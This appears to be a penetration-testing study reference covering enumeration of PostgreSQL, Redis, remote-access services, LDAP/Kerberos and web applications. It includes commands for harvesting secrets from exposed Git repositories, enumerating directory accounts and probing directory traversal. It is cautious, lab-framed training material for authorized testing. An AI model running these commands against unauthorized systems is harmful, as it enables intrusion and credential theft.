methods.clue: PostgreSQL access or an application connection string
methods.conditions: Accepted connection/database role; COPY PROGRAM needs the corresponding server privilege and an executable OS context
methods.access: A confirmed reachable application; anonymous context or one identified credential
methods.result: Database information or a verified privilege-backed OS effect
methods.mechanics: SQL access does not imply server superuser. File/program functions execute as the database service and are gated by database roles and OS permissions.
methods.example: Observation: a database role can read application tables. Test: inspect role attributes. Illustrative output: rolsuper is false and program-execution rights are absent. Interpretation: recover useful data without treating SQL access as a shell.
methods.verify: Separate returned rows, file operations and command execution; prove the actual operating-system identity for the latter.
methods.failure: Role or OS permission failures require another allowed primitive, not a different spelling of the same denied operation.

recognition.where: Authenticate to the observed database and inspect current/session identity and role attributes before program/file functions.
recognition.sample:
current_user | session_user
APP_USER     | APP_USER
rolname      | rolsuper
APP_USER     | f
recognition.spot: An ordinary database role does not automatically have COPY PROGRAM or server-file access.
recognition.confirm: Inspect effective role memberships and exact operation rights, then the database service's OS context.
recognition.enabled: The needed execution/file role and a usable consumer are established: select that documented operation.
recognition.ruledout: No superuser or required operation-specific privilege rules out the proposed program-execution route.
recognition.unknown: Unknown inherited role rights leave the operation unresolved; enumerate memberships before deciding.

methods.procedure:
```bash psql -h TARGET -p PORT -U USER -d postgres ``` ```text \conninfo \l \du \dn \dt *.* ``` ```sql SELECT version(), current_user, session_user; SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles; ```
PostgreSQL variant — server file/program privilege boundary ```sql SELECT pg_has_role(current_user, 'pg_read_server_files', 'member'); SELECT pg_has_role(current_user, 'pg_write_server_files', 'member'); SELECT pg_has_role(current_user, 'pg_execute_server_program', 'member'); ``` Server-side `COPY ... FROM/TO 'file'` uses the PostgreSQL server's filesystem and service identity. `COPY ... PROGRAM` executes on the server and requires superuser or the corresponding predefined role. Client-side `\copy` reads/writes the client filesystem and is not the same primitive.
> **Failure cues:** connection refusal/timeout is network or listener context; login rejection is authentication/context; an empty database list may be visibility limits; object denial is authorization. Query only bounded rows first. Never assume that reading application credentials or obtaining database admin implies OS execution. > **Next action:** identify application accounts, hashes/credentials, paths and linked systems; record the precise grant enabling any file or execution primitive; validate recovered credentials in the later credential block and re-enumerate after any identity change.

methods.title: Inspect Redis access and persistence boundaries
methods.clue: A Redis listener or application cache credentials
methods.conditions: Reachability and accepted authentication/ACL commands; persistence writes need CONFIG rights, destination permissions and a consumer
methods.access: A confirmed reachable application; anonymous context or one identified credential
methods.result: Useful accessible keys or a precisely bounded persistence/file-write candidate
methods.mechanics: Redis keys may disclose sessions or secrets. Historical file-write chains depend on command permissions, persistence format and a writable useful path; an open port alone proves none of them.
methods.example: Observation: PING returns PONG but CONFIG is denied. Test: inspect allowed data access. Illustrative output: only application keys are readable. Interpretation: investigate session/credential value while rejecting a presumed arbitrary-file-write chain.
methods.verify: Verify authentication context, allowed commands and actual key/file effects without assuming old Redis exploit defaults.
methods.failure: NOAUTH and NOPERM identify different boundaries. Investigate credentials or permitted data rather than assuming unauthenticated execution.

recognition.where: Identify Redis and use its authentication context to distinguish accepted commands from denied administrative facilities.
recognition.sample:
PONG
Administrative operation: NOPERM this user has no permissions
recognition.spot: The connection is usable but command ACLs can remove persistence/configuration methods.
recognition.confirm: Inspect allowed operations, data visibility and actual persistence/destination/consumer conditions.
recognition.enabled: Useful keys are readable or a fully permitted file-consumer chain exists: select that bounded capability.
recognition.ruledout: CONFIG denied rules out the familiar configuration-backed file-write route under this identity.
recognition.unknown: PING alone leaves key and administrative rights unknown; inspect the selected permitted command.

methods.procedure:
```bash
nmap -Pn -sV --script redis-info -p PORT TARGET
redis-cli -h TARGET -p PORT PING
redis-cli -h TARGET -p PORT INFO
redis-cli -h TARGET -p PORT ACL WHOAMI
redis-cli -h TARGET -p PORT ACL LIST
```

Authenticated when a password is legitimately known:

```bash
redis-cli -h TARGET -p PORT --askpass
```

> `PONG` proves an accessible Redis command surface, not write/file/execution permission. Check ACLs, mode, bind/protected-mode and persistence/module configuration before reasoning about an effect. Do not run `CONFIG SET`, write keys or load modules during enumeration.

methods.title: Validate RDP, WinRM, VNC and Telnet access contexts
methods.clue: An exposed remote-access application and compatible known credentials
methods.conditions: Enabled destination service, matching authentication and protocol-specific logon/session rights
methods.access: A confirmed reachable application; anonymous context or one identified credential
methods.result: A verified remote session or a precise authentication/authorization failure
methods.mechanics: Remote interactive logon and remote management are different rights. VNC may use its own password; Telnet may expose a different account context from Windows/domain authentication.
methods.example: Observation: SMB accepts a credential but RDP rejects it. Test: separate the RDP service and logon-right checks. Illustrative output: the account lacks remote-interactive authorization. Interpretation: test a justified WinRM or SMB execution path instead.
methods.verify: Verify destination hostname, represented identity and usable effect in the resulting session.
methods.failure: A valid password is not proof of RDP/WinRM rights. Diagnose TLS, transport, account qualification and logon policy separately.

recognition.where: Take remote-access listeners from discovery and validate one known identity against the specific endpoint/logon type.
recognition.sample:
RemotePort : 3389; TcpTestSucceeded : True
RemotePort : 5985; TcpTestSucceeded : False
recognition.spot: Transport offers an RDP candidate from this source; it does not establish remote-interactive rights.
recognition.confirm: Check actual protocol, local/domain context, accepted authentication and endpoint/logon authorization.
recognition.enabled: The intended remote session opens and its identity is verified: enumerate the new host context.
recognition.ruledout: A known-valid identity lacks that logon right: reject this access form for the account.
recognition.unknown: A timeout cannot distinguish host firewall, route or absent service; verify the failed layer.

methods.procedure:
> **Recognize:** RDP commonly uses TCP/3389; WinRM commonly uses 5985/HTTP and 5986/HTTPS. **Goal:** determine whether one known credential is accepted in the correct local/domain context and whether it is authorized for a usable session. ##### RDP baseline: authentication-only check ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore ``` Some distributions expose the binary as `xfreerdp`. Omit `/d:DOMAIN` for the intended local-account context; use `/u:TARGET\\USER` if needed to make that context explicit. > **Decisive output:** successful authentication-only validation supports that the credential is accepted for RDP/NLA. It does not prove an interactive desktop will be granted under every policy/session condition.
Variant — open an RDP desktop ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore ``` Let FreeRDP prompt for the password. `/cert:ignore` suppresses certificate validation and is suitable only in the controlled lab context; it removes server-identity protection.
Variant — identify RDP security requirements ```bash nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info TARGET ``` This can disclose supported security layers, NLA and NTLM host/domain clues. It does not validate a credential.
##### WinRM baseline: interactive session ```bash evil-winrm -i TARGET -u USER ``` ```bash evil-winrm -i TARGET -u 'DOMAIN\\USER' ``` Omitting `-p` makes the established Ruby client prompt for the password. > **Decisive output:** an interactive PowerShell prompt establishes WinRM authorization. Immediately verify identity and host context with `whoami`, `hostname` and `Get-NetIPAddress`.
Variant — WinRM over HTTPS ```bash evil-winrm -i TARGET -u USER -S -P 5986 ``` Check `evil-winrm -h` because the established Ruby client and newer `evil-winrm-py` use different long-option spelling. Do not assume a copied command matches the installed implementation.
Variant — Windows PowerShell remoting ```powershell $cred = Get-Credential Enter-PSSession -ComputerName TARGET -Credential $cred ``` PowerShell remoting uses the configured WinRM endpoint. Local trusted-host, Kerberos/name-resolution and endpoint authorization settings can fail independently of password validity.
> **Failure cues:** certificate warnings are different from authentication failure. RDP errors can reflect NLA, account context, expired/locked accounts or missing logon rights. WinRM `401` supports authentication/authorization failure; `WinRM cannot process the request` can be name resolution, trusted-host, listener or transport context. Valid SMB credentials do not guarantee RDP or WinRM rights. > **Next action:** after a session, re-enumerate identity, groups, privileges, files, local services/listeners and routes. Password spraying, pass-the-hash and ticket use belong to later credential/AD blocks. ##### VNC ```bash nmap -Pn -sV --script vnc-info -p PORT TARGET vncviewer TARGET:PORT ``` > VNC may expose a desktop without Windows logon semantics; the VNC server's authentication and the resulting OS session identity are separate. Use `realvnc-auth-bypass` or password testing only for a confirmed compatible product and explicit authorized objective, then verify the desktop identity. ##### Telnet ```bash nmap -Pn -sV -p PORT TARGET nc -nv TARGET PORT telnet TARGET PORT ``` > Telnet is plaintext and may expose a banner/login prompt. Validate only legitimately acquired credentials; do not make `telnet-brute` a baseline. After login, verify host and identity because appliance/application shells can differ from an OS shell. Source supplement: reviewed getSH Nmap VNC/Telnet blocks.

methods.title: Discover LDAP naming contexts and authenticated search
methods.clue: LDAP/Kerberos listeners or a probable AD domain
methods.conditions: Reachable directory; anonymous query permission or valid bind identity; required signing/TLS and naming context
methods.access: A confirmed reachable application; anonymous context or one identified credential
methods.result: A directory base DN and permitted account/group/computer attributes
methods.mechanics: RootDSE can disclose naming contexts without permitting subtree enumeration. A bind identity, search base and attribute/object ACLs independently constrain results.
methods.example: Observation: RootDSE returns a base DN. Test: attempt the permitted scoped search with the appropriate bind. Illustrative output: anonymous search is denied but a domain bind succeeds. Interpretation: continue authenticated domain mapping.
methods.verify: Record DC, base DN, bind identity and actual returned attributes; RootDSE alone is not a complete directory dump.
methods.failure: Stronger-auth-required may mean TLS/signing policy; invalid credentials or an empty base require different fixes.

recognition.where: Identify the directory endpoint and query RootDSE before a subtree search under a known bind identity.
recognition.sample:
dn:
defaultNamingContext: DC=DOMAIN,DC=TLD
recognition.spot: RootDSE supplies the search base; it does not grant arbitrary anonymous subtree access.
recognition.confirm: Check bind identity, transport/signing requirements and read visibility on the selected objects.
recognition.enabled: A correctly authenticated scoped search returns expected objects: continue domain mapping.
recognition.ruledout: Anonymous subtree search is denied: reject anonymous enumeration while retaining a known-authenticated option.
recognition.unknown: An empty result may be the wrong base/filter or ACL visibility; compare a known object.

methods.procedure:
> **Recognition:** LDAP commonly appears on TCP/389 or TCP/636; Global Catalog on TCP/3268 or 3269; Kerberos on TCP/UDP 88. Applications may listen elsewhere, so follow protocol evidence rather than port labels. ##### Baseline: discover naming contexts > **Prerequisite:** LDAP reachability. **Coverage:** RootDSE only; this can work even when directory searches require authentication. **Decisive output:** `defaultNamingContext` and `dnsHostName`. ```bash ldapsearch -x -LLL -H ldap://TARGET:389 -s base -b '' \ defaultNamingContext rootDomainNamingContext configurationNamingContext dnsHostName ``` Convert `DC=corp,DC=example` into `corp.example` for DNS/Kerberos work. Preserve the server's exact hostname because Kerberos is name-sensitive.
LDAPS and certificate-name inspection ```bash openssl s_client -connect TARGET:636 -servername DC_HOST A certificate can disclose domain/DC names. A TLS validation error is a client trust/name issue, not proof that LDAP is unavailable.
##### Anonymous directory search > **Prerequisite:** known base DN and server permitting anonymous search. **Failure cue:** `Inappropriate authentication` or `Insufficient access` closes only the anonymous path. ```bash ldapsearch -x -LLL -H ldap://DC_IP:389 -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName memberOf description ``` ```bash ldapsearch -x -LLL -H ldap://DC_IP:389 -b 'DC=DOMAIN,DC=TLD' \ '(objectClass=group)' cn member description ``` ##### Authenticated search > **Prerequisite:** a valid directory identity. **Decisive output:** objects/attributes unavailable anonymously. Avoid placing a real password in shell history when an interactive prompt is available. ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 \ -D 'USER@DOMAIN.TLD' -W -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName memberOf description servicePrincipalName userAccountControl ```
Search computers, groups and SPN-bearing accounts separately ```bash ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN.TLD' -W \ -b 'DC=DOMAIN,DC=TLD' '(objectClass=computer)' \ dNSHostName operatingSystem operatingSystemVersion servicePrincipalName ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN.TLD' -W \ -b 'DC=DOMAIN,DC=TLD' '(objectClass=group)' cn member ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN.TLD' -W \ -b 'DC=DOMAIN,DC=TLD' '(&(objectCategory=person)(servicePrincipalName=*))' \ sAMAccountName servicePrincipalName memberOf ```
##### Kerberos prerequisites before an attack Kerberos failures are often name/time/route failures rather than credential failures. Establish: ```bash getent hosts DC_HOST nc -nvz DC_IP 88 date -u nmap -Pn -sV -p 88,389,445,464,636,3268,3269 DC_IP -oN dc-services.txt ``` > **Interpretation:** resolve `DOMAIN` and `DC_HOST` consistently, keep clock skew within Kerberos tolerance, and ensure the KDC is reached through the selected route. `KDC_ERR_C_PRINCIPAL_UNKNOWN` points to identity/domain naming; `KRB_AP_ERR_SKEW` points to time; `KDC_ERR_PREAUTH_FAILED` normally points to authentication material. ##### Handoff - New users, groups, computers, SPNs or domain names → [domain mapping](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md). - A user confirmed without preauthentication → [Kerberos and identity transitions](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md). - Valid credentials → rerun authenticated LDAP plus SMB/share/remote-access enumeration. - Certificate templates/AD CS clues → [AD CS and object-control abuse](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md).

methods.clue: A confirmed SIP or IRC application
methods.conditions: Application-specific request format; permitted registration/channel/configuration access
methods.access: A confirmed reachable application; anonymous context or one identified credential
methods.result: Service capabilities, identity clues or an evidence-matched exploit candidate
methods.mechanics: Protocol identification and configuration may expose useful users or product versions. Do not replace application evidence with the expected service at a conventional port.
methods.example: Observation: a nonstandard port responds as IRC. Test: inspect its normal registration/banner behavior. Illustrative output: a named build and accessible channel information. Interpretation: record identity clues and verify any public exploit's exact prerequisites.
methods.verify: Retain protocol responses and distinguish product clues from confirmed vulnerabilities.
methods.failure: A generic banner or denied registration leaves access unproven; return to version/configuration matching.

recognition.where: Classify the unusual listener, then use its normal greeting/registration behavior and the owning procedure's bounded protocol checks.
recognition.commands:
```bash
nmap -Pn -sV -p PORT TARGET
nc -nv TARGET PORT
```
recognition.sample:
PORT/tcp open irc APPLICATION_VERSION
:HOSTNAME NOTICE AUTH :registration required
recognition.spot: The real protocol and registration state determine the next client operation; the expected port label is insufficient.
recognition.confirm: Verify application/version, accepted interaction and exact exploit/access conditions.
recognition.enabled: Normal protocol interaction exposes useful configuration or an exact vulnerable component: follow that candidate.
recognition.ruledout: The listener speaks another protocol: remove the SIP/IRC assumption.
recognition.unknown: A silent client-first or UDP service requires an appropriate protocol request; no greeting is not a version conclusion.

methods.procedure:
These source-site topics contain only first-pass reconnaissance. Treat them as application-identification branches, not default exploitation paths.

##### SIP

> Commonly UDP/TCP 5060 or TLS 5061; follow protocol evidence.

```bash
nmap -Pn -sU -sV --script sip-methods -p 5060 TARGET
nmap -Pn -sT -sV --script sip-methods -p 5060 TARGET
```

> **Decisive output:** a SIP response and supported methods. `open|filtered` without application response remains ambiguous. Do not run `sip-brute` until the exact registrar, known test identities, lockout policy and explicit authorization are established.

##### IRC

```bash
nmap -Pn -sV --script irc-info -p PORT TARGET
nc -nv TARGET PORT
```

Minimal registration for an authorized test client:

```text
NICK testnick
USER testuser 0 * :Test User
QUIT
```

> **Decisive output:** IRC numeric replies, server/network name, version/capabilities or authentication requirement. Do not use `irc-brute` as identification; authenticate only with legitimately acquired credentials.

methods.title: Establish scheme, host, redirects and request state
methods.clue: An HTTP endpoint, redirect or hostname-dependent response
methods.conditions: Correct scheme/port and virtual host; saved cookies/headers for authenticated comparisons
methods.access: A reachable HTTP application and recorded anonymous or authenticated request state
methods.result: A reproducible application identity and baseline request
methods.mechanics: TLS SNI, Host, redirects and cookies can select different applications. A response from the IP URL does not describe every hostname served by that listener.
methods.checks:
```bash
curl -skD headers.txt -o body.html http://TARGET:PORT/
curl -skI https://TARGET:PORT/
```
methods.example: Observation: the IP URL redirects to a hostname. Test: send the correct Host/SNI while routing to the assigned address. Illustrative output: a distinct application login appears. Interpretation: map that application separately.
methods.verify: Record final URL, host, status, redirects, cookies and authentication context before comparing payload results.
methods.failure: A redirect loop or generic default page may indicate a wrong host or missing session rather than a nonexistent application.

recognition.where: Request the assigned HTTP endpoint without following redirects blindly; inspect location, cookies and alternate scheme/hostname behavior.
recognition.commands:
```bash
curl -skD headers.txt -o body.html http://TARGET:PORT/
curl -skI https://TARGET:PORT/
```
recognition.sample:
HTTP/1.1 302 Found
Location: https://HOSTNAME/
Set-Cookie: SESSION_COOKIE
recognition.spot: The hostname/scheme redirect identifies the application request context to reproduce.
recognition.confirm: Confirm the hostname routes to the assigned address and preserve its TLS/Host/session state.
recognition.enabled: The correct named request reaches a distinct application: map its functions.
recognition.ruledout: The candidate name produces only the default missing-host response: discard that virtual-host inference.
recognition.unknown: Redirect loops can mean missing cookies/host routing; repair the normal request before testing vulnerabilities.

methods.procedure:
```bash curl -skL -D headers.txt -o body.html http://TARGET:PORT/ curl -sk -o /dev/null -w 'code=%{http_code} bytes=%{size_download} type=%{content_type} redirect=%{redirect_url}\n' http://TARGET:PORT/ ``` > **Decisive output:** record the scheme, hostname/`Host` header, port, redirects, page title, certificate names, server/framework clues and whether the view is anonymous or authenticated.
Variant — explicit virtual-host candidate ```bash curl -sk -H 'Host: CANDIDATE.DOMAIN' http://TARGET:PORT/ ``` Compare it with a random hostname. A different status alone is weak evidence; compare body, length, title and redirects.
Variant — preserve cookies and follow redirects ```bash curl -skL -c cookies.txt -b cookies.txt http://TARGET:PORT/PATH ``` Use a separate cookie jar per identity. Do not mix anonymous, ordinary-user and administrator evidence.
Variant — replay through Burp Community ```bash curl -sk -x http://127.0.0.1:8080 http://TARGET:PORT/PATH ``` Confirm the proxy listener is active on `127.0.0.1:8080`. Use `-k` only for the controlled lab because it disables destination-certificate verification.

methods.title: Map functions, roles and normal requests manually
methods.clue: Forms, downloads, exports, account functions or role-specific interfaces
methods.conditions: A normal request baseline and the relevant account/role; authorized accounts for role comparisons
methods.access: A reachable HTTP application and recorded anonymous or authenticated request state
methods.result: An input/function/role map with concrete attack hypotheses
methods.mechanics: The same functionality can expose different trust boundaries through object IDs, methods and roles. Changing one property while preserving request state makes differences interpretable.
methods.example: Observation: a report download accepts a numeric ID. Test: compare objects owned by two authorized study accounts. Illustrative output: a lower role receives another account's report. Interpretation: proceed to an object-authorization method.
methods.verify: Retain method, route, input location, identity and expected normal behavior; do not infer vulnerability from an interesting parameter name.
methods.failure: Expired sessions, CSRF failures and malformed requests can imitate access-control differences; reproduce a valid baseline first.

recognition.where: Browse the site's normal account, export, upload and download features while recording requests in the browser/proxy.
recognition.sample:
Observed browser request:
GET /download?file=report.pdf
Cookie: SESSION_COOKIE
recognition.spot: The normal request exposes a file-selecting input discovered through functionality, not guessed from a payload list.
recognition.confirm: Find the actual input semantics, account/role and normal response before file/read/authorization tests.
recognition.enabled: Controlled comparisons prove a useful primitive: choose its method and remaining checks.
recognition.ruledout: The parameter only selects an allowlisted public report: discard unrestricted-path inference.
recognition.unknown: Unknown ownership or an expired session prevents interpreting differences; re-establish the baseline.

methods.procedure:
For every visible function, capture one unchanged request in Burp Proxy history, send it to Repeater and record:

```text
METHOD PATH | CONTENT-TYPE | ACCESS CONTEXT/ROLE
INPUT LOCATION + NAME | BASELINE VALUE
STATUS | LENGTH/HASH | REDIRECT | MARKER/ERROR/TIME
OBJECT/FUNCTION SELECTED | NEXT ONE-VARIABLE TEST
```

Check login/registration/reset, profiles/objects, search/filter/pagination, download/export/preview, upload/import, administration and every JavaScript API call.

> **Next:** a browser-side restriction is not server authorization. Replay the raw request and change one field, object reference, method or access-context element at a time.

methods.mechanics: Client code and repository history can preserve endpoints and removed secrets. An exposed Git HEAD proves metadata exposure; repository completeness and secret validity require separate checks.
methods.example: Observation: Git metadata is exposed. Test: recover only available objects and inspect history. Illustrative output: a removed database connection string. Interpretation: classify the account and validate current database access.
methods.verify: Confirm actual file/history content and distinguish a historical secret from a usable current credential.
methods.failure: A 200 soft-404 or incomplete object database is not a recovered repository. Compare known-missing paths and record missing history.

recognition.where: Inspect linked JavaScript/source, robots/sitemaps, relevant backups and a bounded Git metadata check from the mapped web application.
recognition.sample:
robots.txt: Disallow: /INTERNAL_PATH/
.git/HEAD: ref: refs/heads/main
recognition.spot: The path and Git reference are investigation leads; neither proves a working secret or complete repository.
recognition.confirm: Compare missing-path controls, retrieve actual permitted artifacts and verify recovered history/account context.
recognition.enabled: Relevant source/history is recoverable and exposes a typed artifact: inspect it through the credential workflow.
recognition.ruledout: The same body is returned for arbitrary missing paths: reject the apparent metadata exposure.
recognition.unknown: HEAD without objects leaves repository recovery incomplete; document available content instead of inventing history.

methods.procedure:
```bash
curl -sk http://TARGET:PORT/robots.txt
curl -sk http://TARGET:PORT/sitemap.xml
curl -sk http://TARGET:PORT/.git/HEAD
curl -sk http://TARGET:PORT/openapi.json
curl -sk http://TARGET:PORT/swagger.json
```

Also inspect HTML comments, hidden inputs, form actions, linked JavaScript, route strings, source-map references, cookies and response headers.

> **Decisive output:** a path, parameter, API schema, object identifier, component or secret-bearing artifact that creates a specific next request. Source disclosure is not command execution.

```bash
curl -ski http://TARGET:PORT/.git/HEAD
curl -ski http://TARGET:PORT/.git/config
```

> A readable `HEAD`/`config` supports exposed repository metadata. A `403`, redirect or generic template is not proof. Preserve the correct host header/base path.

If authorized, recover into a new local directory with a purpose-built tool and inspect locally:

```bash
git-dumper http://TARGET:PORT/.git/ repo-output
git -C repo-output status
git -C repo-output log --oneline --all --decorate
git -C repo-output log -p --all
```

`git-dumper` is an optional third-party helper; install on demand in an isolated environment only when the exposure has been confirmed. Manual object recovery is possible but slower.

```bash
rg -ni 'password|passwd|token|secret|api[_-]?key|private[_-]?key' repo-output
git -C repo-output log --all -S'password' --oneline
git -C repo-output log --all -G'pass(word)?|secret|token' --oneline
```

Inspect candidate commits without dumping all history:

```bash
git -C repo-output show COMMIT -- PATH
git -C repo-output diff COMMIT^ COMMIT -- PATH
```

Validate freshness, identity and compatible use. Removed historical values are often rotated or environment-specific.

methods.title: Discover directories and files with controlled response filtering
methods.clue: An application has unlinked paths, backups or administration endpoints
methods.conditions: Correct base URL/session and a measured nonexistent-path response; bounded relevant wordlist
methods.access: A reachable HTTP application and recorded anonymous or authenticated request state
methods.result: Verified candidate routes and files
methods.mechanics: Discovery enumerates names; wildcard responses, redirects and soft-404 pages can make every guess appear valid. Confirm candidates through independent retrieval and behavior.
methods.example: Observation: every path returns 200. Test: compare the missing-path body/length before filtering. Illustrative output: one candidate has a distinct export response. Interpretation: inspect that function manually.
methods.verify: Open candidates and record their actual behavior; status/length alone is only a selection clue.
methods.failure: Aggressive filters can hide genuine routes and rate limiting can fabricate differences; validate the baseline and reduce the request rate.

recognition.where: Establish the application's missing-path response, then run a bounded content search with the existing session/host context.
recognition.sample:
Missing control: status=200, body=DEFAULT_ERROR
Candidate /EXPORT_PATH/: status=200, body=EXPORT_FORM
recognition.spot: The candidate's actual function differs from the soft-404 control despite equal status codes.
recognition.confirm: Request a known-missing path under the same host/session and compare status, body and length. Open each distinct Gobuster/ffuf result; a uniform login page or soft-404 is a filter problem, not a directory finding.
recognition.enabled: Independent retrieval confirms an actual function: add its request to the behavior map.
recognition.ruledout: The candidate matches the wildcard error body: remove it from the useful queue.
recognition.unknown: Rate limiting or session expiry distorts response size; restore stable controls before filtering.

methods.procedure:
Request a random nonexistent path first and record its status, length and body marker. ```bash gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-root.txt ``` > **Decisive output:** manually verified routes including useful `200`, redirect, `401`, `403` and `405` responses.
Variant — technology-aware extensions ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -t 10 -o gobuster-ext.txt ``` Choose extensions from observed stack evidence; do not spray every extension.
Variant — authenticated discovery ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -c 'SESSION=VALUE' -H 'Authorization: Bearer TOKEN' -t 10 -o gobuster-auth.txt ``` Use only the cookie or header that applies. An expired session can turn every result into the same login redirect.
Variant — filter a confirmed wildcard body length ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST --exclude-length NOISE_LENGTH -t 10 -o gobuster-filtered.txt ``` Filtering without first confirming the noise response can hide a real path.

methods.title: Discover virtual hosts and hostname-selected applications
methods.clue: DNS names, redirects, certificate names or a default virtual-host response
methods.conditions: A destination listener, relevant domain candidates and controlled Host/SNI routing
methods.access: A reachable HTTP application and recorded anonymous or authenticated request state
methods.result: Additional verified applications on the same address
methods.mechanics: Virtual-host routing uses the requested hostname. DNS resolution, HTTP Host and TLS SNI must be aligned when the server selects behavior at more than one layer.
methods.example: Observation: a certificate suggests an internal application name. Test: resolve it to the assigned address while preserving SNI. Illustrative output: a separate administration interface. Interpretation: give it its own request and credential map.
methods.verify: Compare candidate and nonexistent-host responses, including content and redirects; resolve to the intended scoped address.
methods.failure: A default response for every host or an SNI mismatch makes the result inconclusive; do not treat every guessed hostname as a real application.

recognition.where: Collect hostnames from redirects, certificates, DNS and source; compare named requests against an invalid-host control.
recognition.sample:
Host HOSTNAME: application login page
Host INVALID_HOST: default server page
recognition.spot: A reproducible hostname-selected application is a new mapping target on the same address.
recognition.confirm: Send a random Host header as a negative control, compare the candidate's real response, then browse it with the correct hostname. A different status caused only by redirects or a default site is not a confirmed vhost.
recognition.enabled: The named application has distinct verified behavior: give it its own session/function map.
recognition.ruledout: All candidate hosts receive the same default body: discard the claimed distinct application.
recognition.unknown: TLS routing or local DNS is wrong: fix that context before deciding a vhost is absent.

methods.procedure:
```bash
gobuster vhost -u http://DOMAIN:PORT/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt
```

Alternative with automatic calibration:

```bash
ffuf -w WORDLIST -u http://TARGET:PORT/ -H 'Host: FUZZ.DOMAIN' -ac -o ffuf-vhosts.json
```

> **Failure cue:** uniform status/length may be the default vhost. Compare each candidate with a random host header before adding it to the application map.

methods.title: Map parameters, API methods, objects and writable properties
methods.clue: An API/schema, numeric object IDs, hidden fields or different HTTP methods
methods.conditions: A valid request and explicit role/object ownership; exact input format and content type
methods.access: A reachable HTTP application and recorded anonymous or authenticated request state
methods.result: A parameter/object/method inventory and testable authorization or injection hypothesis
methods.mechanics: APIs enforce security at route, object and property boundaries. A valid JSON body can be accepted while a sensitive field is ignored; test its persisted effect separately.
methods.example: Observation: an API response includes a role property. Test: compare documented writable fields and a controlled update. Illustrative output: the field is ignored and privilege is unchanged. Interpretation: that mass-assignment hypothesis is disproven; investigate other boundaries.
methods.verify: Prove which input is consumed and whether state changes persist in an independent read.
methods.failure: HTTP 400/415 may indicate encoding/schema rather than security enforcement. Keep a valid request before changing permissions-related properties.

recognition.where: Capture a valid API request, inspect its schema/client code and compare allowed methods and controlled object/role contexts.
recognition.spot: The actual object, method and writable input are known; returned owner/role fields are only candidate security boundaries.
recognition.confirm: Determine field binding, ownership, persistence and server authorization with controlled accounts.
recognition.enabled: A protected field/action changes under a lower role and is independently verified: select its authorization method.
recognition.ruledout: The server ignores the sensitive field and privileges remain unchanged: reject that assignment hypothesis.
recognition.unknown: Malformed JSON or wrong content type makes a failed request inconclusive; reproduce the valid update first.

methods.procedure:
GET parameter names: ```bash ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://TARGET:PORT/PATH?FUZZ=test' -ac -o params-get.json ``` POST form parameter names: ```bash ffuf -w WORDLIST -u http://TARGET:PORT/PATH -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'known=value&FUZZ=test' -ac -o params-post.json ``` Object values with an authenticated API: ```bash ffuf -w NUMBERS -u 'http://TARGET:PORT/api/objects/FUZZ' -H 'Authorization: Bearer TOKEN' -mc all -fc 404 -o object-values.json ``` > **Decisive output:** a manually reproduced parameter or value that changes application behavior. Tool outliers are candidates, not confirmed access-control flaws.
ffuf — preserve a captured authenticated request Save a working raw request from the proxy as request.txt, retain its Host/cookie/body, and put FUZZ at the single parameter name/value or path being tested. Replay it once manually first. The request file does not specify TLS: choose the transport explicitly. ```bash # HTTPS request, including its original method and session headers ffuf -request request.txt -request-proto https -w WORDLIST -mc all -ac -t 10 -o request-https.json # Plain HTTP request: otherwise ffuf defaults to HTTPS ffuf -request request.txt -request-proto http -w WORDLIST -mc all -ac -t 10 -o request-http.json ``` > **Read:** compare an outlier's status/length/body with a known missing value, then replay that exact request. A login redirect for every value → refresh the session before continuing. A one-time CSRF token → repair token handling; the saved-request flag does not refresh it automatically. [ffuf request configuration](https://github.com/ffuf/ffuf/wiki/Home#request-configuration).
```bash curl -ski http://TARGET:PORT/api/v1/PATH curl -ski -X OPTIONS http://TARGET:PORT/api/v1/PATH curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD"}' http://TARGET:PORT/api/v1/login ``` > **Interpretation:** `405` can establish that a route exists but rejects the method. Validation errors can reveal required fields. A token establishes only the authorization demonstrated by a later request. Build a matrix across anonymous, user A, user B and administrator contexts where available: ```text PATH | METHOD | IDENTITY/ROLE | OBJECT/PROPERTY | RESULT | NEXT ```

methods.title: Read files through directory traversal
methods.clue: A download/path parameter or URL segment influences a local filename
methods.conditions: Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: A verified file-read primitive and relevant source/configuration/credential artifacts
methods.mechanics: Traversal changes path resolution. URL decoding, application normalization and curl path normalization are separate layers; readable bytes do not establish interpreted inclusion.
methods.example: Observation: a download function accepts a filename. Test: request a recognizable system file with one controlled traversal. Illustrative output: expected account-file content. Interpretation: file read is confirmed; investigate relevant application configuration.
methods.verify: Require recognizable target-file content and controls that exclude a reflected input or static error page.
methods.failure: An empty/denied response can be path depth, normalization or file permissions. If only file read is proven, follow credentials instead of assuming code execution.

